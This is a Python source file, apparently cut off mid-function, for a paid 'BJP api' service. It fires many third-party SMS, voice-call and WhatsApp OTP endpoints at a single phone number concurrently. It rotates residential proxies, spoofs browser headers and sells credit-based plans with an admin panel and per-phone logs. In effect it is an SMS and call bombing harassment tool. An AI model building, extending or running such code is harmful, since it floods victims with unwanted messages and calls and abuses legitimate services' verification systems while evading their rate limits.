#!/usr/bin/env python3
"""
BJP api — single-file OTP dispatch server.
Subcommands:
  serve                        start the API + admin panel
  seed                         mint the first admin key
  convert                      reload/validate merged.json
  prune <phone> [--write]      fire-test all endpoints, optionally write merged.pruned.json
"""

import asyncio
import base64
import json
import os
import random
import re
import secrets
import sqlite3
import string
import sys
import time
import uuid
from contextlib import asynccontextmanager
from pathlib import Path
from typing import Any, Optional

import httpx
from dotenv import load_dotenv
from fastapi import FastAPI, Request, Response, HTTPException, Form, Depends
from fastapi.responses import HTMLResponse, JSONResponse, RedirectResponse, StreamingResponse
from fastapi.middleware.cors import CORSMiddleware
from starlette.middleware.sessions import SessionMiddleware

load_dotenv()

# ─────────────────────────────────────────────────────────────
# CONFIG
# ─────────────────────────────────────────────────────────────

ROOT = Path(__file__).parent
DB_PATH       = os.getenv("DB_PATH", str(ROOT / "bjp.db"))
MERGED_PATH   = os.getenv("MERGED_PATH", str(ROOT / "merged.json"))
SESSION_SECRET= os.getenv("SESSION_SECRET", "change-me-please")
ADMIN_USER    = os.getenv("ADMIN_USER", "admin")
ADMIN_PASS    = os.getenv("ADMIN_PASS", "admin")
PORT          = int(os.getenv("PORT", "6767"))
HOST          = os.getenv("HOST", "0.0.0.0")
DEFAULT_TIMEOUT_MS = int(os.getenv("DEFAULT_TIMEOUT_MS", "3000"))
MAX_CONCURRENCY    = int(os.getenv("MAX_CONCURRENCY", "25"))

# Oxylabs
PROXY_ENABLED       = os.getenv("PROXY_ENABLED", "false").lower() == "true"
PROXY_PROVIDER      = os.getenv("PROXY_PROVIDER", "oxylabs")
OXY_USER            = os.getenv("OXY_USER", "")
OXY_PASS            = os.getenv("OXY_PASS", "")
OXY_HOST            = os.getenv("OXY_HOST", "pr.oxylabs.io")
OXY_PORT            = int(os.getenv("OXY_PORT", "7777"))
OXY_SESSION_PREFIX  = os.getenv("OXY_SESSION_PREFIX", "")
OXY_SESSION_TIME    = int(os.getenv("OXY_SESSION_TIME", "10"))
PROXY_FALLBACK_DIRECT = os.getenv("PROXY_FALLBACK_DIRECT", "true").lower() == "true"

# Placeholder defaults
PH_RECAPTCHA  = os.getenv("PLACEHOLDER_RECAPTCHA", "")
PH_CSRF       = os.getenv("PLACEHOLDER_CSRF", "")
PH_JWT        = os.getenv("PLACEHOLDER_JWT", "")
PH_TURNSTILE  = os.getenv("PLACEHOLDER_TURNSTILE", "")
PH_AUTHKEY    = os.getenv("PLACEHOLDER_AUTHKEY", "")
PH_BASICAUTH  = os.getenv("PLACEHOLDER_BASICAUTH", "")
PH_IP         = os.getenv("PLACEHOLDER_IP", "")

# ─────────────────────────────────────────────────────────────
# DATABASE
# ─────────────────────────────────────────────────────────────

def db():
    conn = sqlite3.connect(DB_PATH, timeout=30)
    conn.row_factory = sqlite3.Row
    conn.execute("PRAGMA journal_mode=WAL")
    conn.execute("PRAGMA synchronous=NORMAL")
    return conn

def init_db():
    with db() as c:
        c.executescript("""
            CREATE TABLE IF NOT EXISTS api_keys (
              id INTEGER PRIMARY KEY AUTOINCREMENT,
              key TEXT UNIQUE NOT NULL,
              label TEXT,
              plan TEXT DEFAULT 'free',
              credits INTEGER DEFAULT 0,
              credits_used INTEGER DEFAULT 0,
              max_endpoints INTEGER DEFAULT 100,
              max_concurrency INTEGER DEFAULT 25,
              max_rounds INTEGER DEFAULT 1,
              round_interval_ms INTEGER DEFAULT 600000,
              used_today INTEGER DEFAULT 0,
              used_total INTEGER DEFAULT 0,
              last_reset INTEGER DEFAULT 0,
              revoked INTEGER DEFAULT 0,
              admin INTEGER DEFAULT 0,
              created_at INTEGER NOT NULL,
              expires_at INTEGER
            );
            CREATE TABLE IF NOT EXISTS request_log (
              id INTEGER PRIMARY KEY AUTOINCREMENT,
              key_id INTEGER,
              session_id TEXT,
              phone TEXT,
              endpoint_id TEXT,
              endpoint_name TEXT,
              endpoint_type TEXT,
              status_code INTEGER,
              success INTEGER,
              elapsed_ms INTEGER,
              proxy_used TEXT,
              error TEXT,
              created_at INTEGER NOT NULL
            );
            CREATE INDEX IF NOT EXISTS idx_log_key ON request_log(key_id);
            CREATE INDEX IF NOT EXISTS idx_log_phone ON request_log(phone);
            CREATE INDEX IF NOT EXISTS idx_log_created ON request_log(created_at);
            CREATE INDEX IF NOT EXISTS idx_log_id ON request_log(id);

            CREATE TABLE IF NOT EXISTS sessions (
              id TEXT PRIMARY KEY,
              key_id INTEGER,
              phone TEXT,
              started_at INTEGER,
              finished_at INTEGER,
              total_fired INTEGER DEFAULT 0,
              total_success INTEGER DEFAULT 0,
              status TEXT DEFAULT 'running'
            );
            CREATE TABLE IF NOT EXISTS proxy_stats (
              proxy TEXT PRIMARY KEY,
              hits INTEGER DEFAULT 0,
              failures INTEGER DEFAULT 0,
              last_used INTEGER DEFAULT 0,
              last_status INTEGER,
              banned INTEGER DEFAULT 0
            );
            CREATE TABLE IF NOT EXISTS audit_log (
              id INTEGER PRIMARY KEY AUTOINCREMENT,
              actor TEXT,
              action TEXT,
              detail TEXT,
              ip TEXT,
              created_at INTEGER NOT NULL
            );
        """)
    print(f"[db] initialized at {DB_PATH}")

# ─────────────────────────────────────────────────────────────
# ENDPOINT LOADER (merged.json)
# ─────────────────────────────────────────────────────────────

_ENDPOINTS: list[dict] = []
_ENDPOINTS_MTIME = 0

def load_endpoints() -> list[dict]:
    global _ENDPOINTS, _ENDPOINTS_MTIME
    p = Path(MERGED_PATH)
    if not p.exists():
        print(f"[endpoints] merged.json not found at {MERGED_PATH}")
        _ENDPOINTS = []
        return _ENDPOINTS
    mtime = p.stat().st_mtime
    if _ENDPOINTS and mtime == _ENDPOINTS_MTIME:
        return _ENDPOINTS
    raw = json.loads(p.read_text(encoding="utf-8"))
    entries = raw if isinstance(raw, list) else raw.get("endpoints", [])
    normalized = []
    for i, e in enumerate(entries):
        url = e.get("url", "")
        if not url or not url.startswith(("http://", "https://")):
            continue
        name = e.get("name") or f"endpoint_{i}"
        etype = "sms"
        low = (name + " " + url).lower()
        if any(k in low for k in ("voice", "call", "voice-otp", "otp_on_call", "iscall")):
            etype = "call"
        elif "whatsapp" in low or "whats_app" in low:
            etype = "whatsapp"
        normalized.append({
            "id": e.get("id") or f"ep_{i:03d}",
            "name": name,
            "type": etype,
            "method": (e.get("method") or "POST").upper(),
            "url": url,
            "headers": e.get("headers") or {},
            "data": e.get("data"),
            "count": int(e.get("count") or 1),
        })
    _ENDPOINTS = normalized
    _ENDPOINTS_MTIME = mtime
    print(f"[endpoints] loaded {len(normalized)} from {MERGED_PATH}")
    return _ENDPOINTS

# ─────────────────────────────────────────────────────────────
# PLACEHOLDER RESOLVER + REQUEST SHAPING
# ─────────────────────────────────────────────────────────────

def _rand(n: int) -> str:
    return "".join(random.choices(string.digits, k=n))

def _rand_alnum(n: int) -> str:
    return "".join(random.choices(string.ascii_letters + string.digits, k=n))

def resolve_placeholders(text: str, phone: str) -> str:
    if not isinstance(text, str):
        return text
    def sub(m):
        k = m.group(1)
        if k == "phone":           return phone
        if k == "rand":            return _rand(6)
        if k == "rand5":           return _rand(5)
        if k == "rand50":          return _rand_alnum(50)
        if k == "uuid36":          return str(uuid.uuid4())
        if k == "b64_+91_phone":   return base64.b64encode(f"+91{phone}".encode()).decode()
        if k == "recaptcha":       return PH_RECAPTCHA
        if k == "csrf":            return PH_CSRF
        if k == "jwt":             return PH_JWT
        if k == "turnstile":       return PH_TURNSTILE
        if k == "authkey":         return PH_AUTHKEY
        if k == "basicauth":       return PH_BASICAUTH
        if k == "ip":              return PH_IP or "127.0.0.1"
        return m.group(0)
    return re.sub(r"\{([^{}]+)\}", sub, text)

def deep_resolve(obj: Any, phone: str) -> Any:
    if isinstance(obj, str):  return resolve_placeholders(obj, phone)
    if isinstance(obj, list): return [deep_resolve(x, phone) for x in obj]
    if isinstance(obj, dict): return {k: deep_resolve(v, phone) for k, v in obj.items()}
    return obj

def shape_request(endpoint: dict, phone: str) -> dict:
    url = resolve_placeholders(endpoint["url"], phone)
    headers = {k: resolve_placeholders(v, phone) for k, v in endpoint["headers"].items()}
    headers.setdefault("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36")
    headers.setdefault("Accept", "*/*")
    headers.setdefault("Accept-Language", "en-US,en;q=0.9")

    data = endpoint.get("data")
    content = None
    if data is not None:
        resolved = deep_resolve(data, phone)
        ct_lower = {k.lower(): v for k, v in headers.items()}.get("content-type", "")
        if isinstance(resolved, (dict, list)):
            content = json.dumps(resolved)
            if "content-type" not in {k.lower() for k in headers}:
                headers["Content-Type"] = "application/json"
        else:
            content = str(resolved)
            if "content-type" not in {k.lower() for k in headers}:
                s = content.strip()
                if s.startswith("------WebKitFormBoundary") or "--boundary" in s:
                    pass
                else:
                    headers["Content-Type"] = "application/x-www-form-urlencoded"
    return {"url": url, "method": endpoint["method"], "headers": headers, "content": content}

# ─────────────────────────────────────────────────────────────
# PROXY (Oxylabs)
# ─────────────────────────────────────────────────────────────

_oxy_session_counter = 0

def build_oxylabs_proxy() -> Optional[str]:
    global _oxy_session_counter
    if not PROXY_ENABLED or not OXY_USER or not OXY_PASS:
        return None
    _oxy_session_counter += 1
    session_id = f"{OXY_SESSION_PREFIX}{_oxy_session_counter:06d}" if OXY_SESSION_PREFIX else str(_oxy_session_counter)
    entry = f"http://customer-{OXY_USER}-sessid-{session_id}-sesstime-{OXY_SESSION_TIME}:{OXY_PASS}@{OXY_HOST}:{OXY_PORT}"
    return entry

def record_proxy_result(proxy: Optional[str], ok: bool, status: int):
    if not proxy:
        return
    with db() as c:
        row = c.execute("SELECT * FROM proxy_stats WHERE proxy=?", (proxy,)).fetchone()
        if not row:
            c.execute("INSERT INTO proxy_stats (proxy, hits, failures, last_used, last_status) VALUES (?,?,?,?,?)",
                      (proxy, 1 if ok else 0, 0 if ok else 1, int(time.time()*1000), status))
            return
        c.execute("UPDATE proxy_stats SET hits=hits+?, failures=failures+?, last_used=?, last_status=? WHERE proxy=?",
                  (1 if ok else 0, 0 if ok else 1, int(time.time()*1000), status, proxy))

# ─────────────────────────────────────────────────────────────
# FIRING ENGINE
# ─────────────────────────────────────────────────────────────

async def fire_one(client: httpx.AsyncClient, endpoint: dict, phone: str,
                   timeout_ms: int, use_proxy: bool) -> dict:
    start = time.time()
    proxy = build_oxylabs_proxy() if use_proxy else None
    try:
        shaped = shape_request(endpoint, phone)
        kwargs = {
            "method": shaped["method"],
            "url": shaped["url"],
            "headers": shaped["headers"],
            "timeout": timeout_ms / 1000.0,
            "follow_redirects": True,
        }
        if shaped["content"] is not None and shaped["method"] not in ("GET", "HEAD"):
            kwargs["content"] = shaped["content"]
        if proxy:
            kwargs["proxy"] = proxy

        r = await client.request(**kwargs)
        success = 200 <= r.status_code < 400
        record_proxy_result(proxy, success, r.status_code)
        return {
            "endpoint_id": endpoint["id"],
            "endpoint_name": endpoint["name"],
            "endpoint_type": endpoint["type"],
            "success": success,
            "status": r.status_code,
            "elapsed_ms": int((time.time() - start) * 1000),
            "proxy_used": proxy or "",
            "error": None,
        }
    except Exception as e:
        # fallback direct
        if proxy and PROXY_FALLBACK_DIRECT:
            record_proxy_result(proxy, False, 0)
            try:
                shaped = shape_request(endpoint, phone)
                kwargs = {
                    "method": shaped["method"],
                    "url": shaped["url"],
                    "headers": shaped["headers"],
                    "timeout": timeout_ms / 1000.0,
                    "follow_redirects": True,
                }
                if shaped["content"] is not None and shaped["method"] not in ("GET", "HEAD"):
                    kwargs["content"] = shaped["content"]
                r = await client.request(**kwargs)
                success = 200 <= r.status_code < 400
                return {
                    "endpoint_id": endpoint["id"], "endpoint_name": endpoint["name"],
                    "endpoint_type": endpoint["type"], "success": success,
                    "status": r.status_code, "elapsed_ms": int((time.time() - start) * 1000),
                    "proxy_used": "direct-fallback", "error": None,
                }
            except Exception as e2:
                e = e2
        return {
            "endpoint_id": endpoint["id"], "endpoint_name": endpoint["name"],
            "endpoint_type": endpoint["type"], "success": False, "status": 0,
            "elapsed_ms": int((time.time() - start) * 1000),
            "proxy_used": proxy or "",
            "error": "timeout" if "timeout" in str(e).lower() else str(e)[:200],
        }

async def fire_all(endpoints: list[dict], phone: str, concurrency: int, timeout_ms: int,
                   use_proxy: bool) -> list[dict]:
    sem = asyncio.Semaphore(max(1, concurrency))
    results: list[Optional[dict]] = [None] * len(endpoints)
    limits = httpx.Limits(max_connections=concurrency * 2, max_keepalive_connections=concurrency)
    async with httpx.AsyncClient(limits=limits, verify=False) as client:
        async def worker(i, ep):
            async with sem:
                results[i] = await fire_one(client, ep, phone, timeout_ms, use_proxy)
        await asyncio.gather(*(worker(i, ep) for i, ep in enumerate(endpoints)))
    return [r for r in results if r]

# ─────────────────────────────────────────────────────────────
# AUTH + KEYS
# ─────────────────────────────────────────────────────────────

PLANS = {
    "free":  {"credits": 0,    "max_endpoints": 50,  "max_concurrency": 10, "max_rounds": 1},
    "pro":   {"credits": 500,  "max_endpoints": 200, "max_concurrency": 25, "max_rounds": 5},
    "elite": {"credits": 5000, "max_endpoints": 410, "max_concurrency": 50, "max_rounds": 10},
    "admin": {"credits": 999999, "max_endpoints": 500, "max_concurrency": 75, "max_rounds": 99},
}

def gen_key(plan: str = "free") -> str:
    prefix = "bjp_adm" if plan == "admin" else "bjp"
    return f"{prefix}_{secrets.token_urlsafe(24)}"

def create_key(label: str = "", plan: str = "free", days: int = 30, admin: bool = False,
               credits: Optional[int] = None) -> dict:
    p = PLANS.get(plan, PLANS["free"])
    key = gen_key("admin" if admin else plan)
    now = int(time.time() * 1000)
    expires = now + days * 86400000 if days > 0 else None
    cr = credits if credits is not None else p["credits"]
    with db() as c:
        cur = c.execute("""INSERT INTO api_keys
            (key, label, plan, credits, max_endpoints, max_concurrency, max_rounds,
             last_reset, admin, created_at, expires_at)
            VALUES (?,?,?,?,?,?,?,?,?,?,?)""",
            (key, label, "admin" if admin else plan, cr, p["max_endpoints"],
             p["max_concurrency"], p["max_rounds"], now, 1 if admin else 0, now, expires))
        kid = cur.lastrowid
    return {"id": kid, "key": key, "label": label, "plan": "admin" if admin else plan,
            "credits": cr, "admin": 1 if admin else 0, "expires_at": expires}

def validate_key(key: Optional[str]) -> dict:
    if not key:
        return {"ok": False, "reason": "missing"}
    with db() as c:
        row = c.execute("SELECT * FROM api_keys WHERE key=?", (key,)).fetchone()
    if not row:
        return {"ok": False, "reason": "invalid"}
    if row["revoked"]:
        return {"ok": False, "reason": "revoked"}
    if row["expires_at"] and time.time() * 1000 > row["expires_at"]:
        return {"ok": False, "reason": "expired"}
    return {"ok": True, "data": dict(row)}

def check_credits(kid: int, required: int = 1) -> dict:
    with db() as c:
        row = c.execute("SELECT credits, admin FROM api_keys WHERE id=?", (kid,)).fetchone()
    if not row:
        return {"ok": False, "reason": "not_found"}
    if row["admin"]:
        return {"ok": True, "remaining": row["credits"]}
    if row["credits"] < required:
        return {"ok": False, "reason": "credits_exhausted", "remaining": row["credits"]}
    return {"ok": True, "remaining": row["credits"]}

def deduct_credits(kid: int, amount: int):
    if amount <= 0:
        return
    with db() as c:
        row = c.execute("SELECT credits, admin FROM api_keys WHERE id=?", (kid,)).fetchone()
        if not row or row["admin"]:
            return
        nb = max(0, row["credits"] - amount)
        c.execute("UPDATE api_keys SET credits=?, credits_used=credits_used+? WHERE id=?",
                  (nb, amount, kid))

def add_credits(kid: int, amount: int) -> int:
    with db() as c:
        c.execute("UPDATE api_keys SET credits=credits+? WHERE id=?", (amount, kid))
        row = c.execute("SELECT credits FROM api_keys WHERE id=?", (kid,)).fetchone()
    return row["credits"] if row else 0

def set_credits(kid: int, amount: int):
    with db() as c:
        c.execute("UPDATE api_keys SET credits=? WHERE id=?", (amount, kid))

def list_keys(limit: int = 500) -> list[dict]:
    with db() as c:
        rows = c.execute("SELECT * FROM api_keys ORDER BY id DESC LIMIT ?", (limit,)).fetchall()
    return [dict(r) for r in rows]

def audit(actor: str, action: str, detail: str = "", ip: str = ""):
    with db() as c:
        c.execute("INSERT INTO audit_log (actor, action, detail, ip, created_at) VALUES (?,?,?,?,?)",
                  (actor, action, detail, ip, int(time.time() * 1000)))

# ─────────────────────────────────────────────────────────────
# LOGGING
# ─────────────────────────────────────────────────────────────

def log_results(key_id: int, phone: str, session_id: str, results: list[dict]):
    now = int(time.time() * 1000)
    with db() as c:
        c.executemany("""INSERT INTO request_log
            (key_id, session_id, phone, endpoint_id, endpoint_name, endpoint_type,
             status_code, success, elapsed_ms, proxy_used, error, created_at)
            VALUES (?,?,?,?,?,?,?,?,?,?,?,?)""",
            [(key_id, session_id, phone, r.get("endpoint_id", ""), r.get("endpoint_name", ""),
              r.get("endpoint_type", "sms"), r.get("status", 0), 1 if r.get("success") else 0,
              r.get("elapsed_ms", 0), r.get("proxy_used", ""), r.get("error"), now)
             for r in results])

def create_session(sid: str, key_id: int, phone: str):
    with db() as c:
        c.execute("INSERT INTO sessions (id, key_id, phone, started_at, status) VALUES (?,?,?,?, 'running')",
                  (sid, key_id, phone, int(time.time() * 1000)))

def close_session(sid: str, fired: int, success: int, status: str = "completed"):
    with db() as c:
        c.execute("UPDATE sessions SET finished_at=?, total_fired=?, total_success=?, status=? WHERE id=?",
                  (int(time.time() * 1000), fired, success, status, sid))

def get_recent_logs(limit: int = 100, key_id: Optional[int] = None, phone: Optional[str] = None,
                    since_id: int = 0) -> list[dict]:
    sql = "SELECT * FROM request_log"
    where, params = [], []
    if key_id:  where.append("key_id=?"); params.append(key_id)
    if phone:   where.append("phone=?");  params.append(phone)
    if since_id:where.append("id>?");    params.append(since_id)
    if where: sql += " WHERE " + " AND ".join(where)
    sql += " ORDER BY id DESC LIMIT ?"
    params.append(limit)
    with db() as c:
        return [dict(r) for r in c.execute(sql, params).fetchall()]

def get_recent_sessions(limit: int = 50) -> list[dict]:
    with db() as c:
        return [dict(r) for r in c.execute(
            "SELECT * FROM sessions ORDER BY started_at DESC LIMIT ?", (limit,)).fetchall()]

def get_global_stats() -> dict:
    with db() as c:
        t = c.execute("""SELECT COUNT(*) as fired, COALESCE(SUM(success),0) as hits,
                                COALESCE(AVG(elapsed_ms),0) as avg_ms FROM request_log""").fetchone()
        keys = c.execute("SELECT COUNT(*) as c FROM api_keys WHERE revoked=0").fetchone()["c"]
        sessions = c.execute("SELECT COUNT(*) as c FROM sessions").fetchone()["c"]
        credits = c.execute("SELECT COALESCE(SUM(credits),0) as c FROM api_keys WHERE admin=0").fetchone()["c"]
    return {
        "total_fired": t["fired"], "total_hits": t["hits"], "avg_ms": int(t["avg_ms"] or 0),
        "active_keys": keys, "total_sessions": sessions, "total_credits_outstanding": credits,
    }

def get_max_log_id() -> int:
    with db() as c:
        r = c.execute("SELECT COALESCE(MAX(id),0) as m FROM request_log").fetchone()
    return r["m"] if r else 0

# ─────────────────────────────────────────────────────────────
# THEME + LAYOUT (white + green, aesthetic)
# ─────────────────────────────────────────────────────────────

CSS = """
* { box-sizing: border-box; margin: 0; padding: 0; }
:root {
  --bg: #f8faf9; --panel: #ffffff; --panel-2: #f1f6f3;
  --border: #e3ece6; --border-strong: #c8dbd0;
  --text: #0f172a; --muted: #64748b;
  --green: #16a34a; --green-2: #22c55e; --green-soft: #dcfce7;
  --red: #ef4444; --amber: #f59e0b;
  --shadow: 0 1px 2px rgba(16,24,40,.04), 0 4px 16px rgba(16,24,40,.06);
  --shadow-lg: 0 8px 32px rgba(16,24,40,.08);
  --radius: 14px; --radius-sm: 10px;
  --mono: ui-monospace, SFMono-Regular, Menlo, Consolas, monospace;
}
html, body {
  background: var(--bg); color: var(--text); font-size: 14px;
  font-family: -apple-system, BlinkMacSystemFont, "Inter", "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
  line-height: 1.5; -webkit-font-smoothing: antialiased;
}
a { color: var(--green); text-decoration: none; transition: color .2s ease; }
a:hover { color: var(--green-2); }
.wrap { max-width: 1180px; margin: 0 auto; padding: 24px 22px 80px; animation: fadeIn .4s ease; }
@keyframes fadeIn { from { opacity: 0; transform: translateY(6px); } to { opacity: 1; transform: none; } }
@keyframes slideUp { from { opacity: 0; transform: translateY(12px); } to { opacity: 1; transform: none; } }
@keyframes pulse { 0%,100% { transform: scale(1); opacity: 1; } 50% { transform: scale(1.15); opacity: .75; } }
@keyframes shimmer { 0% { background-position: -200% 0; } 100% { background-position: 200% 0; } }

header.top {
  display: flex; align-items: center; justify-content: space-between;
  padding: 14px 26px; background: rgba(255,255,255,.85);
  backdrop-filter: blur(12px); border-bottom: 1px solid var(--border);
  position: sticky; top: 0; z-index: 20;
}
.brand { display: flex; align-items: center; gap: 10px; font-weight: 800; letter-spacing: .4px; font-size: 15px; }
.brand .dot {
  width: 10px; height: 10px; border-radius: 50%;
  background: linear-gradient(135deg, var(--green), var(--green-2));
  box-shadow: 0 0 0 4px rgba(34,197,94,.15);
  animation: pulse 2.4s ease-in-out infinite;
}
.brand .tag { font-weight: 500; color: var(--muted); font-size: 12px; }
.nav { display: flex; gap: 4px; }
.nav a {
  padding: 8px 14px; border-radius: 999px; color: var(--muted);
  font-weight: 600; font-size: 13px; transition: all .22s ease;
}
.nav a:hover { background: var(--panel-2); color: var(--text); }
.nav a.active {
  background: linear-gradient(135deg, var(--green), var(--green-2));
  color: #fff; box-shadow: 0 4px 14px rgba(34,197,94,.3);
}

main { padding: 0; }
h1 { font-size: 22px; font-weight: 800; letter-spacing: -.3px; margin: 0 0 16px; }
h2 { font-size: 12px; font-weight: 700; color: var(--muted); text-transform: uppercase;
     letter-spacing: 1.4px; margin: 26px 0 10px; }
p.muted, .muted { color: var(--muted); }
.good { color: var(--green); } .bad { color: var(--red); } .warn { color: var(--amber); }

.card {
  background: var(--panel); border: 1px solid var(--border);
  border-radius: var(--radius); padding: 20px; margin-bottom: 16px;
  box-shadow: var(--shadow); transition: box-shadow .25s ease, transform .25s ease;
  animation: slideUp .35s ease backwards;
}
.card:hover { box-shadow: var(--shadow-lg); }
.card.tight { padding: 14px 16px; }

.hero {
  text-align: center; padding: 36px 20px 28px; margin-bottom: 20px;
  background: linear-gradient(180deg, #ffffff 0%, var(--panel-2) 100%);
  border: 1px solid var(--border); border-radius: 20px;
  position: relative; overflow: hidden; box-shadow: var(--shadow);
  animation: slideUp .4s ease;
}
.hero::before {
  content: ""; position: absolute; inset: 0;
  background: radial-gradient(circle at 50% 0%, rgba(34,197,94,.14), transparent 60%);
  pointer-events: none;
}
.hero h0 {
  display: block; font-size: 96px; line-height: 1; font-weight: 900;
  letter-spacing: -4px; background: linear-gradient(135deg, var(--green), var(--green-2));
  -webkit-background-clip: text; background-clip: text; color: transparent;
  margin: 0 0 8px; position: relative;
}
@media (max-width: 640px) { .hero h0 { font-size: 68px; } }
.hero .sub { color: var(--muted); font-size: 13px; letter-spacing: 3px; text-transform: uppercase; font-weight: 600; }
.hero .underline {
  width: 90px; height: 3px; margin: 16px auto 0;
  background: linear-gradient(90deg, transparent, var(--green), transparent);
  border-radius: 2px; animation: shimmer 3s linear infinite;
  background-size: 200% 100%;
}

.grid { display: grid; gap: 14px; }
.cols-2 { grid-template-columns: repeat(2, minmax(0,1fr)); }
.cols-3 { grid-template-columns: repeat(3, minmax(0,1fr)); }
.cols-4 { grid-template-columns: repeat(4, minmax(0,1fr)); }
@media (max-width: 860px) { .cols-2, .cols-3, .cols-4 { grid-template-columns: 1fr; } }

.stat {
  background: var(--panel); border: 1px solid var(--border);
  border-radius: var(--radius-sm); padding: 16px;
  transition: transform .22s ease, box-shadow .22s ease, border-color .22s ease;
}
.stat:hover { transform: translateY(-2px); box-shadow: var(--shadow-lg); border-color: var(--border-strong); }
.stat .k { color: var(--muted); font-size: 11px; font-weight: 700; text-transform: uppercase; letter-spacing: 1.2px; }
.stat .v { font-size: 24px; font-weight: 800; margin-top: 6px; letter-spacing: -.4px; }
.stat .v.good { color: var(--green); }
.stat .v.bad { color: var(--red); }
.stat .v.warn { color: var(--amber); }

form { display: grid; gap: 12px; }
label { font-size: 11px; font-weight: 700; color: var(--muted); text-transform: uppercase; letter-spacing: 1.1px; }
input, select, textarea {
  font: inherit; color: var(--text); background: var(--panel-2);
  border: 1px solid var(--border); border-radius: var(--radius-sm);
  padding: 11px 13px; outline: none; width: 100%; transition: all .2s ease;
}
input:focus, select:focus, textarea:focus {
  border-color: var(--green); background: #fff;
  box-shadow: 0 0 0 4px rgba(34,197,94,.12);
}
button, .btn {
  cursor: pointer; background: linear-gradient(135deg, var(--green), var(--green-2));
  color: #fff; border: none; padding: 11px 18px; border-radius: var(--radius-sm);
  font-weight: 700; font-size: 13px; letter-spacing: .3px; width: auto;
  transition: transform .15s ease, box-shadow .2s ease, filter .2s ease;
  box-shadow: 0 4px 14px rgba(34,197,94,.25);
}
button:hover, .btn:hover { transform: translateY(-1px); box-shadow: 0 6px 20px rgba(34,197,94,.35); filter: brightness(1.03); }
button:active, .btn:active { transform: translateY(0); }
button.ghost {
  background: var(--panel-2); color: var(--text);
  border: 1px solid var(--border); box-shadow: none;
}
button.ghost:hover { background: #fff; border-color: var(--border-strong); }
button.small { padding: 6px 11px; font-size: 12px; }
button.danger { background: linear-gradient(135deg, #ef4444, #f87171); box-shadow: 0 4px 14px rgba(239,68,68,.25); }
button.good { background: linear-gradient(135deg, var(--green), var(--green-2)); }

table { width: 100%; border-collapse: collapse; font-size: 13px; }
th, td { padding: 10px 12px; text-align: left; border-bottom: 1px solid var(--border); vertical-align: middle; }
th { color: var(--muted); font-weight: 700; font-size: 11px; text-transform: uppercase; letter-spacing: 1.1px; background: var(--panel-2); }
tr { transition: background .15s ease; }
tbody tr:hover td { background: var(--panel-2); }
tbody tr { animation: fadeIn .3s ease backwards; }

.pill { display: inline-block; padding: 4px 10px; border-radius: 999px; font-size: 11px;
        font-weight: 700; letter-spacing: .4px; text-transform: uppercase; }
.pill.good { background: var(--green-soft); color: #15803d; }
.pill.bad { background: #fee2e2; color: #b91c1c; }
.pill.warn { background: #fef3c7; color: #b45309; }
.pill.gray { background: var(--panel-2); color: var(--muted); }

.mono { font-family: var(--mono); font-size: 12px; }
.row { display: flex; gap: 10px; align-items: center; flex-wrap: wrap; }
.kv { display: grid; grid-template-columns: 200px 1fr; gap: 8px 16px; font-size: 13px; }
.kv .k { color: var(--muted); font-weight: 600; }
code { background: var(--panel-2); padding: 2px 7px; border-radius: 6px; font-family: var(--mono); font-size: 12px; }
pre { background: var(--panel-2); border: 1px solid var(--border); border-radius: var(--radius-sm);
      padding: 14px; overflow-x: auto; font-size: 12px; font-family: var(--mono); line-height: 1.6; }
.hidden { display: none !important; }
.flex-between { display: flex; justify-content: space-between; align-items: center; gap: 10px; }

.toast {
  position: fixed; bottom: 24px; right: 24px; background: #fff;
  border: 1px solid var(--border); border-left: 4px solid var(--green);
  padding: 14px 18px; border-radius: var(--radius-sm); box-shadow: var(--shadow-lg);
  z-index: 100; display: none; font-weight: 600; animation: slideUp .3s ease;
}
.toast.show { display: block; }
.toast.bad { border-left-color: var(--red); }

footer.credits {
  text-align: center; padding: 22px 20px 30px; margin-top: 30px;
  border-top: 1px solid var(--border);
  color: var(--muted); font-size: 12px; letter-spacing: .3px;
}
footer.credits a { font-weight: 700; margin: 0 4px; }
footer.credits .sep { color: var(--border-strong); margin: 0 8px; }
"""

def layout(title: str, body: str, active: str = "") -> str:
    def nav(label, href, key):
        cls = "active" if active == key else ""
        return f'<a href="{href}" class="{cls}">{label}</a>'
    return f"""<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>{title} · BJP api</title>
<style>{CSS}</style>
</head>
<body>
<header class="top">
  <div class="brand"><span class="dot"></span> BJP api <span class="tag">v1</span></div>
  <nav class="nav">
    {nav("Dashboard","/dashboard","dashboard")}
    {nav("Keys","/keys","keys")}
    {nav("Logs","/logs","logs")}
    {nav("Proxies","/proxies","proxies")}
    {nav("API","/docs","docs")}
    <a href="#" id="logoutLink">Logout</a>
  </nav>
</header>
<main class="wrap">
{body}
<footer class="credits">
  Developer <a href="https://t.me/emortaos" target="_blank">@emortaos</a>
  <span class="sep">·</span>
  Channel <a href="https://t.me/bomberjantaparty" target="_blank">@bomberjantaparty</a>
</footer>
</main>
<div class="toast" id="toast"></div>
<script>
window.toast = function(m, t) {{
  const el = document.getElementById('toast');
  el.textContent = m; el.className = 'toast show ' + (t || '');
  clearTimeout(window.__t); window.__t = setTimeout(() => el.className = 'toast', 2600);
}};
window.api = async function(path, opts) {{
  opts = opts || {{}};
  opts.headers = Object.assign({{'content-type':'application/json'}}, opts.headers || {{}});
  if (opts.body && typeof opts.body !== 'string') opts.body = JSON.stringify(opts.body);
  const res = await fetch(path, opts);
  const txt = await res.text();
  let data; try {{ data = JSON.parse(txt); }} catch {{ data = {{ raw: txt }}; }}
  if (!res.ok) throw Object.assign(new Error(data.error || 'request failed'), {{ status: res.status, data }});
  return data;
}};
document.getElementById('logoutLink').addEventListener('click', async (e) => {{
  e.preventDefault();
  try {{ await api('/api/admin/logout', {{ method: 'POST' }}); }} catch {{}}
  location.href = '/admin';
}});
</script>
</body>
</html>"""

# ─────────────────────────────────────────────────────────────
# FASTAPI APP
# ─────────────────────────────────────────────────────────────

@asynccontextmanager
async def lifespan(app: FastAPI):
    init_db()
    load_endpoints()
    yield

app = FastAPI(lifespan=lifespan, docs_url=None, redoc_url=None)
app.add_middleware(SessionMiddleware, secret_key=SESSION_SECRET, max_age=12*3600, same_site="lax")
app.add_middleware(CORSMiddleware, allow_origins=["*"], allow_methods=["*"], allow_headers=["*"])

def is_admin(req: Request) -> bool:
    return bool(req.session.get("admin"))

def get_key(req: Request) -> Optional[str]:
